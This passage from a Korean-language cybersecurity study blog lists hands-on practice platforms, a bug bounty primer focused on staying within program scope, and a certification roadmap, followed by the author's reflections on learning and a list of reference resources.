| 플랫폼 | 특징 | 비용 |
|--------|------|------|
| [HackTheBox](https://hackthebox.com) | 실제 기업 환경과 유사한 머신 | 무료/유료 |
| [TryHackMe](https://tryhackme.com) | 입문자 친화적, 가이드형 학습 | 무료/유료 |
| [PortSwigger Web Academy](https://portswigger.net/web-security) | 웹 취약점 전문, Burp Suite 실습 | 무료 |
| [PentesterLab](https://pentesterlab.com) | CVE 기반 실습 | 무료/유료 |
| [VulnHub](https://vulnhub.com) | 다운로드형 취약 VM 모음 | 무료 |
| [picoCTF](https://picoctf.org) | CTF 입문, Carnegie Mellon 운영 | 무료 |

### 버그바운티 입문

취약점을 발견해 기업에 신고하고 보상금을 받는 합법적 활동이다.

```
추천 플랫폼
├─ HackerOne (https://hackerone.com)
├─ Bugcrowd (https://bugcrowd.com)
└─ Samsung MPS, KakaoTalk 자체 버그바운티 프로그램

시작 방법
1. 공개된 버그바운티 프로그램의 범위(Scope) 확인
2. 범위 내 대상만 테스트
3. 취약점 발견 시 재현 방법 포함하여 신고
4. 중복·범위 외 제출은 보상 없음
```

### 자격증 로드맵

```
입문
└─ CompTIA Security+ — 보안 기초 개념

중급
├─ CEH (Certified Ethical Hacker) — 모의해킹 기초
└─ eJPT (eLearnSecurity Junior Penetration Tester) — 실기 중심

고급
├─ OSCP (Offensive Security Certified Professional) — 업계 표준, 24시간 실기 시험
├─ CRTO (Certified Red Team Operator) — 레드팀 전문
└─ CISSP — 보안 관리자·아키텍트 대상

국내
├─ 정보보안기사
└─ CPPG (개인정보관리사)
```

---

## 느낀점

공부하면서 제일 황당했던 게, 수천억짜리 보안 사고가 MFA 하나 안 걸어둬서 터진다는 거였다. Change Healthcare가 그 케이스인데, "설마 진짜로?" 싶었다. 근데 실제로 그렇다는 게 좀 어이없기도 하고, 반대로 생각하면 기본만 잘 해도 막을 수 있다는 거니까 오히려 희망적이기도 하고.

모의해킹 쪽 공부할 때는 솔직히 처음에 좀 쫄렸다. "이거 그냥 해킹 배우는 거 아닌가?" 싶어서. CTF랑 DVWA 같은 실습 환경이 따로 있다는 걸 알고 나서야 마음 놓고 했다. 허가 없이 실제 사이트에 하면 불법이라는 건 계속 염두에 두고 있다.

아직 모르는 게 훨씬 많다. 어셈블리는 여전히 보면 머리가 하얘지고, 실제 악성코드 샘플 분석은 이제 겨우 시작한 수준이다. 그래도 예전엔 뉴스에서 BPFDoor, 인포스틸러 이런 단어 나오면 그냥 넘겼는데 이제는 "아, 그게 이렇게 동작하는 거구나" 하고 읽히는 게 좀 다르긴 하다. 그 차이가 생긴 게 지금은 그걸로 충분한 것 같다.

---

*참고 자료*
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [YARA Documentation](https://yara.readthedocs.io/)
- [Cuckoo Sandbox](https://cuckoosandbox.org/)
- [Any.run Interactive Sandbox](https://any.run/)
- [VirusTotal](https://www.virustotal.com/)
- [HackTheBox](https://hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [Malware Unicorn Workshops](https://malwareunicorn.org/)
- [Practical Malware Analysis (책)](https://nostarch.com/malware)
